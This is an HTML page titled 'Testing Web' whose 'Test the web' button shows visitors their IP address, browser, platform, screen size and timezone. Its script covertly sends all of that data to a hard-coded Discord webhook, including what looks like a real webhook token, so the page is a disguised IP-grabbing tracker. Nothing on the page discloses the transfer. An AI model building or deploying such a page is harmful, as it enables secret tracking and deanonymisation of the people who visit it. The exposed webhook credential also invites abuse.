<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Testing Web</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradientBG 10s ease infinite;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            background-color: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
            width: 100%;
            text-align: center;
        }

        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-size: 18px;
            display: block;
            margin: 20px auto;
            transition: transform 0.3s;
        }

        button:hover {
            transform: scale(1.05);
        }

        .hidden {
            display: none;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .info-item {
            background-color: #f9f9f9;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            font-size: 16px;
            color: #333;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <button id="checkBtn">Test the web</button>
        
        <div id="loading" class="hidden">
            <div class="loader"></div>
            <span>Loading...</span>
        </div>
        
        <div id="results" class="hidden">
            <div class="info-item" id="ipAddress"></div>
            <div class="info-item" id="browser"></div>
            <div class="info-item" id="language"></div>
            <div class="info-item" id="platform"></div>
            <div class="info-item" id="resolution"></div>
            <div class="info-item" id="timezone"></div>
            <div class="info-item" id="localTime"></div>
        </div>
    </div>

    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1536076150588313671/E59OYHq6OolDbbgV35HDKD9t4YIYJNtBuVnNs32x0cmRMXgebyO52QUMwjonMJV1Ym2-';
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
        
        function getBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }
        
        async function sendToWebhook(ip, browserInfo) {
            try {
                const payload = {
                    embeds: [{
                        title: "Network Info Collected",
                        color: 3447003,
                        fields: [
                            { name: "IP Address", value: ip },
                            { name: "User Agent", value: browserInfo.userAgent },
                            { name: "Language", value: browserInfo.language },
                            { name: "Platform", value: browserInfo.platform },
                            { name: "Screen Resolution", value: browserInfo.screenResolution },
                            { name: "Timezone", value: browserInfo.timezone },
                            { name: "Timestamp", value: browserInfo.timestamp }
                        ]
                    }]
                };
                
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Error:', error);
            }
        }
        
        document.getElementById('checkBtn').addEventListener('click', async () => {
            document.getElementById('checkBtn').classList.add('hidden');
            document.getElementById('loading').classList.remove('hidden');
            
            const ip = await getIP();
            const browserInfo = getBrowserInfo();
            
            document.getElementById('ipAddress').textContent = ip;
            document.getElementById('browser').textContent = browserInfo.userAgent;
            document.getElementById('language').textContent = browserInfo.language;
            document.getElementById('platform').textContent = browserInfo.platform;
            document.getElementById('resolution').textContent = browserInfo.screenResolution;
            document.getElementById('timezone').textContent = browserInfo.timezone;
            document.getElementById('localTime').textContent = new Date().toLocaleString();
            
            await sendToWebhook(ip, browserInfo);
            
            document.getElementById('loading').classList.add('hidden');
            document.getElementById('results').classList.remove('hidden');
        });
    </script>
</body>
</html>
